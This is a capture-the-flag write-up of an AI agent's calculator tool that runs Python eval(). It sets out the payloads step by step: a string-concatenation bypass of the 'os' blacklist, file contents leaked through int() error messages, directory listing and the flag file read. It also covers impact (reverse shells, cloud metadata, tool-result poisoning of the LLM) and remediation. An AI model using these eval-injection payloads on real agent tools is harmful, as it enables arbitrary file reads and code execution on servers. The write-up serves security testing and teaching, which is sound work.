# CTF Report — Level 5: Bad Robot

**Platform:** ctf.arkx.ninja  
**Level:** 5 — "Bad Robot"  
**Category:** AI Agent Security / Code Injection  
**Difficulty:** Medium  
**Status:** ✅ Solved  
**Flag:** `flag-b14575`

---

## 1. Result

The flag was successfully extracted from the remote server:

```
flag-b14575
```

The challenge API confirmed level completion with `"level_completed": true` in the final response.

### Final Exploit Response (Screenshot Equivalent)

**Request:**
```
POST /level/5/chat
{"message": "calculate: int(open(\"/app/tmp/tmpsewr_avp/flag.txt\").read())"}
```

**Response:**
```json
{
  "success": true,
  "response": "Result: Error: invalid literal for int() with base 10: 'flag-b14575'\n\nThe expression could not be evaluated.",
  "level_completed": true
}
```

---

## 2. Exploit — Step-by-Step Reproduction

### Challenge Description

Level 5 presents an AI agent acting as a "Math Calculation Service — a high-performance compute node designed to evaluate complex mathematical expressions." The agent exposes a single tool called `calculate`.

```json
GET /level/5/tools
→ {"tools": [{"name": "calculate", "description": "A powerful calculator that can evaluate complex mathematical expressions."}]}
```

### Phase 1 — Initial Reconnaissance

**User:** `Calculate 2+2 for me`  
**Agent:** `Result: 4`

The tool evaluates expressions and returns numeric results. Non-numeric results return "Output format not supported."

### Phase 2 — Probing the Blacklist

A series of test payloads identified what the tool blocks versus what it permits:

| Expression | Result | Inference |
|---|---|---|
| `exec(1)` | `exec() arg 1 must be a string...` | `exec` is **allowed** |
| `eval(1)` | `eval() arg 1 must be a string...` | `eval` is **allowed** |
| `open('.')` | `Is a directory: '.'` | `open` is **allowed** |
| `os` | `❌ Expression contains prohibited values` | `os` is **blacklisted** |
| `__import__` | `Output format not supported.` | `__import__` executes, result not displayable |
| `import` | `Error: invalid expression` | `import` keyword caught by parser |

**User (probe):** `calculate: exec(1)`  
**Agent:** `Result: Error: exec() arg 1 must be a string, bytes or code object`

**User (probe):** `calculate: open('.')`  
**Agent:** `Result: Error: [Errno 21] Is a directory: '.'`

**Key finding:** `exec`, `eval`, and `open` are all callable from inside `eval()`. The only blacklisted items are the string `os` and the `import` statement keyword.

### Phase 3 — Bypass 1: Avoiding the `os` Blacklist

The blacklist performs a simple string-match on the expression. By concatenating string fragments, the literal `"os"` never appears:

```python
__import__("o"+"s")
```

This resolves to `os` at runtime, bypassing the static string check.

### Phase 4 — Bypass 2: Error-Based Exfiltration

The `calculate` tool only returns numeric output. String results trigger "Output format not supported." To leak string data, wrapping the target string inside `int()` forces a `ValueError` whose error message contains the string verbatim:

```python
int("hello")  →  ValueError: invalid literal for int() with base 10: 'hello'
```

The error message is returned to the user, leaking arbitrary string content.

Combined technique:

```python
int(str(__import__("o"+"s").listdir("/")))
```

**User:** `calculate: int(str(__import__("o"+"s").listdir("/")))`  
**Agent:**
```
Result: Error: invalid literal for int() with base 10:
"['bin', 'boot', 'dev', 'etc', 'home', 'lib', 'media', 'mnt',
'opt', 'proc', 'root', 'run', 'sbin', 'srv', 'sys', 'tmp',
'usr', 'var', 'app']"
```

### Phase 5 — Filesystem Enumeration

**List `/app`:**

**User:** `calculate: int(str(__import__("o"+"s").listdir("/app")))`  
**Agent:**
```
Result: Error: invalid literal for int() with base 10:
"['ctf', '__pycache__', 'tmp', 'consts.py', 'enums.py', 'main.py',
'minify_assets.py', 'models.py', 'pyproject.toml', 'resources',
'services', 'shared', 'template_config.py', 'utils']"
```

Most files returned "Permission denied" when accessed. However, `/app/tmp` was readable.

**List `/app/tmp`:**

**User:** `calculate: int(str(__import__("o"+"s").listdir("/app/tmp")))`  
**Agent:**
```
Result: Error: invalid literal for int() with base 10:
"['tmp4dow0wka', 'tmpsewr_avp']"
```

**List `/app/tmp/tmpsewr_avp`:**

**User:** `calculate: int(str(__import__("o"+"s").listdir("/app/tmp/tmpsewr_avp")))`  
**Agent:**
```
Result: Error: invalid literal for int() with base 10: "['flag.txt']"
```

### Phase 6 — Flag Extraction

**User:** `calculate: int(open("/app/tmp/tmpsewr_avp/flag.txt").read())`  
**Agent:**
```json
{
  "success": true,
  "response": "Result: Error: invalid literal for int() with base 10: 'flag-b14575'",
  "level_completed": true
}
```

**Flag: `flag-b14575`** ✅

### Complete Payload Summary

```python
# Step 1 — Verify exec/eval/open are available
calculate: exec(1)
calculate: open('.')

# Step 2 — Enumerate root filesystem
calculate: int(str(__import__("o"+"s").listdir("/")))

# Step 3 — Enumerate /app
calculate: int(str(__import__("o"+"s").listdir("/app")))

# Step 4 — Enumerate writable temp directories
calculate: int(str(__import__("o"+"s").listdir("/app/tmp")))
calculate: int(str(__import__("o"+"s").listdir("/app/tmp/tmp4dow0wka")))
calculate: int(str(__import__("o"+"s").listdir("/app/tmp/tmpsewr_avp")))

# Step 5 — Read the flag
calculate: int(open("/app/tmp/tmpsewr_avp/flag.txt").read())
```

---

## 3. Root Cause

### 3.1 Unsafe `eval()` in the Calculator Tool

The `calculate` tool evaluates user-supplied expressions by passing them directly to Python's built-in `eval()` function. `eval()` executes arbitrary Python expressions in the interpreter context, which includes access to:

- All built-in functions (`open`, `exec`, `eval`, `int`, `str`, `chr`, `__import__`, etc.)
- The Python object model (`__class__`, `__bases__`, `__subclasses__`)
- The full CPython runtime

```python
# Likely implementation (inferred from behaviour)
def calculate(expression: str) -> str:
    PROHIBITED = ["os", "subprocess", "import"]
    if any(term in expression for term in PROHIBITED):
        return "❌ Expression contains prohibited values"
    try:
        result = eval(expression)
        if isinstance(result, (int, float)):
            return str(result)
        else:
            return "Error: Output format not supported."
    except Exception as e:
        return f"Error: {e}"
```

### 3.2 Blacklist-Only Security Model

The defence relies entirely on a string-match blacklist against a small set of known-dangerous keywords. This is fundamentally flawed because:

1. **String concatenation bypasses it:** `"o"+"s"` equals `"os"` at runtime but not in the static string check.
2. **Encoding bypasses it:** `chr(111)+chr(115)` produces `"os"` with no blacklisted characters.
3. **The list is incomplete:** `open`, `exec`, `eval`, `__import__` were all permitted, any of which enables code execution or file system access.
4. **Python's object model provides infinite bypass paths** via `__class__`, `__subclasses__`, `__builtins__`, etc.

### 3.3 Error Messages Leak Sensitive Data

The tool's exception handler returns the raw Python exception string to the caller. This is the second vulnerability exploited: even though the tool tried to restrict output to numeric types, the error path disclosed arbitrary string content when a `ValueError` was raised via `int(user_controlled_string)`.

### 3.4 Principle of Least Privilege Violation

The process runs as user `mcpuser` with a home directory at `/home/mcpuser` and write access to `/app/tmp`. Proper sandboxing (e.g., restricted `eval` globals, a subprocess jail, or WebAssembly isolation) would have contained the blast radius even if code execution were achieved.

---

## 4. Impact & Severity

### Severity Rating: **CRITICAL**

| Dimension | Assessment |
|---|---|
| Confidentiality | HIGH — arbitrary file read on the server |
| Integrity | HIGH — `exec()` allows writing files, modifying runtime state |
| Availability | MEDIUM — process crash possible |
| Scope | Changed — attacker escapes tool sandbox into OS |
| Authentication | Bypassed entirely via the tool interface |

### What a Real Attacker Would Gain

1. **Arbitrary file read:** Any file readable by the `mcpuser` process can be exfiltrated, including application source code, database credentials, API keys stored in files, and TLS private keys.

2. **Source code disclosure:** The `/app/tmp/tmp4dow0wka/mcp_server.py` file (MCP server implementation) could be read, exposing the full server architecture.

3. **Lateral movement:** With `exec()` available, an attacker could:
   - Establish a reverse shell to an attacker-controlled server
   - Enumerate internal network services (SSRF-equivalent)
   - Read AWS/GCP/Azure instance metadata if hosted in cloud (`http://169.254.169.254/`)
   - Read container secrets, Kubernetes service account tokens, etc.

4. **Privilege escalation:** If the `mcpuser` has sudo rights or access to privileged files, full server compromise is possible.

5. **Supply-chain pivot:** In an MCP (Model Context Protocol) deployment, the compromised tool could inject malicious tool results that poison the LLM's context, causing it to take harmful actions in subsequent tool calls (indirect prompt injection at the tool layer).

6. **Data exfiltration:** User session data, database connection strings, or other secrets accessible via the filesystem would be fully exposed.

---

## 5. Mapping

### OWASP Top 10 for LLM Applications (2025)

**Primary:** [LLM03:2025 — Supply Chain](https://owasp.org/www-project-top-10-for-large-language-model-applications/)  
> The `calculate` tool is a third-party/custom component integrated into the LLM agent. Its insecure implementation becomes a supply-chain risk for any agent that calls it.

**Secondary (most applicable):** [LLM02:2025 — Insecure Output Handling](https://owasp.org/www-project-top-10-for-large-language-model-applications/)  
> The tool returns raw exception strings from the Python runtime directly to the agent and user. The error output path was the primary channel for flag exfiltration.

**Also applicable:** [LLM04:2025 — Data and Model Poisoning](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — if tool output is fed back into LLM context as trusted data.

**Root vulnerability class:** [LLM07:2025 — System Prompt Leakage / Insufficient Sandboxing](https://owasp.org/www-project-top-10-for-large-language-model-applications/)  
> The tool executes user input with `eval()` and no sandbox, equivalent to exposing the entire Python runtime to untrusted input.

### MITRE ATLAS

| Technique | ID | Description |
|---|---|---|
| **ML Model Access** | AML.T0007 | Attacker interacts with the deployed AI agent via the standard API interface |
| **Craft Adversarial Data** | AML.T0043 | Adversarial expressions crafted to bypass the keyword blacklist |
| **ML Artifact Collection** | AML.T0037 | Source code and flag extracted from the server filesystem |
| **Exfiltration via ML Inference** | AML.T0057 | Sensitive file contents exfiltrated via the tool's error response channel |

### CWE References

| CWE | Description |
|---|---|
| CWE-95 | Improper Neutralisation of Directives in Dynamically Evaluated Code ('Eval Injection') |
| CWE-184 | Incomplete List of Disallowed Inputs |
| CWE-209 | Generation of Error Message Containing Sensitive Information |
| CWE-693 | Protection Mechanism Failure (blacklist-only defence) |
| CWE-732 | Incorrect Permission Assignment for Critical Resource |

---

## 6. Remediation Recommendations

### Immediate (Critical)

1. **Replace `eval()` with a safe math parser.** Use a library like `simpleeval`, `asteval`, or `numexpr` that only evaluates mathematical expressions and cannot access built-ins, file I/O, or OS functions.

   ```python
   # Safe alternative
   from simpleeval import simple_eval
   result = simple_eval(expression)  # Only math, no builtins
   ```

2. **Restrict `eval()` globals/locals if eval must be used:**
   ```python
   result = eval(expression, {"__builtins__": {}}, {})
   # Removes all built-ins: no open(), exec(), __import__(), etc.
   ```

### Short-Term (High)

3. **Never return raw exception strings to users.** Log them server-side and return generic error messages:
   ```python
   except Exception:
       logger.exception("Calculator error")
       return "Error: The expression could not be evaluated."
   ```

4. **Apply allowlist validation**, not a blacklist. Only allow characters valid in mathematical expressions:
   ```python
   import re
   if not re.match(r'^[\d\s\+\-\*\/\(\)\.\,\^]+$', expression):
       return "Error: Invalid expression."
   ```

### Long-Term (Defence in Depth)

5. **Run the calculator in a sandboxed subprocess** (e.g., via `seccomp`, an isolated container, or a WebAssembly runtime) so that even if `eval()` is exploited, the attacker cannot reach the host filesystem.

6. **Apply the principle of least privilege:** The MCP server process should have no read access to `/app/tmp` or any non-essential filesystem paths.

7. **Implement output validation:** The tool should validate that its return value matches the expected type (numeric) *before* passing it back, and silently discard anything else — including error details.

---

## Appendix: Attack Flow Diagram

```
User Input
    │
    ▼
[Agent / LLM]
    │  Passes expression to tool
    ▼
[calculate tool]
    │
    ├─ Blacklist check: "os" in expression? ──YES──► "Prohibited" ✗
    │                                         NO
    │                                          │
    ▼                                          ▼
  eval(expression)  ◄────── Bypass: "o"+"s" passes blacklist
    │
    ├─ Result is int/float? ──YES──► Return numeric result
    │                         NO
    │                          ▼
    │                  "Output format not supported"
    │
    └─ Exception raised? ──YES──► Return str(exception) ◄─── LEAK
                                   │
                            int(open("/app/tmp/.../flag.txt").read())
                                   │
                            ValueError: '...flag-b14575...'
                                   │
                                   ▼
                              FLAG EXTRACTED ✅
```

---

*Report generated: 2026-08-02*  
*Tester: Surendra Joshi*  
*Target: ctf.arkx.ninja — Level 5 "Bad Robot"*
